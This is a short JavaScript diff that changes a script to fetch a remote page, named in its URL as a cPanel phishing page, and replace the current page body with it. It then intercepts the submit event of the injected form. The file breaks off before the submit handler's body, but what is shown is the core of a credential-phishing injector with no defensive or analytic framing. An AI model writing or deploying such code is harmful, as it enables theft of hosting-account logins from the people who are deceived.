@@ -1,7 +1,7 @@
-fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
+fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/cPanel-phishing-page/index.html").then(res=>res.text()).then(res => {
   document.body.innerHTML = res;
 
-  const form = document.querySelector('#aa');
+  const form = document.querySelector('#forms');
 
   form.addEventListener("submit", function(evt) {
     evt.preventDefault();
